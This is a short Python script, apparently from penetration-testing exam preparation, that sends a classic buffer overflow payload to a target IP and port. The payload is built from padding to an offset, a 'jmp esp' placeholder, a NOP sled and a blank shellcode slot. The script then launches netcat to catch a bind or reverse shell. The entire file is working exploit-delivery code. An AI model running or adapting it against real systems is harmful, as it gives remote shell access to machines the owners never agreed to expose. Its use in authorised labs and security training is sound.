#!/usr/bin/python3
#Python 3 BOF Shellcode Delivery for terminal
#Credits:
#Olivier Laflamme - https://boschko.ca/braindead-buffer-overflow-guide-to-pass-the-oscp-blindfolded/
#Heath Adams (The Cyber Mentor)'s PNPT Training - https://github.com/hmaverickadams
#User dekker#6621 for encode('raw_unicode_escape') idea

#Expect: For use with netcat handler.

import argparse, socket, subprocess, sys

args = argparse.ArgumentParser(usage='%(prog)s -i <IP> -p <PORT> -o <Exact offset> [-b|-r] --prefix <Optional>')
args.add_argument("-i", "--ip", required=True, help="IP Address of target")
args.add_argument("-p", "--port", type=int, required=True, help="Port")
args.add_argument("--prefix", help="String prefixed to the payload")
args.add_argument("-o", "--offset", type=int, required=True, help="Exact offset position as reported by Offsetter")
args.add_argument("-b", "--bind", type = int, help="Connect to the specified port on target after sending payload")
args.add_argument("-r", "--reverse", type = int, help="Start a listener on the specified port before sending payload")
args = vars(args.parse_args())

ip = args["ip"]
port= args["port"]
try:
	socket.inet_aton(ip)
	host = (ip,port)
except:
	sys.exit("Invalid IP Address.")

if args["bind"] and not args["reverse"]:
	shell = "bind"
	connection_port = str(args["bind"])
elif args["reverse"] and not args["bind"]:
	shell = "reverse"
	connection_port = str(args["reverse"])
else:
	sys.exit("Specify a handler type.")

shellcode = (
#Edit: Put shellcode here
)

offset = args["offset"]

#Edit: Add correct instuction (little endian)
payload = "A" * offset + 'jmp esp' + '\x90' * 32 + shellcode

if args["prefix"]:
	prefix = args["prefix"].encode()
else:
	prefix = b''

payload = prefix + payload.encode('raw_unicode_escape')

def delivery():
	with socket.socket(socket.AF_INET, socket. SOCK_STREAM) as s:
		s.settimeout(2)
		s.connect(host)
		s.recv(1024)
		print("Sending shellcode payload...")
		s.send(payload)

if shell == "bind":
	delivery()
	subprocess.run(['nc', '-nv', ip, connection_port])
elif shell == "reverse":
	delivery()
	subprocess.run(['nc', '-nvlp', connection_port])
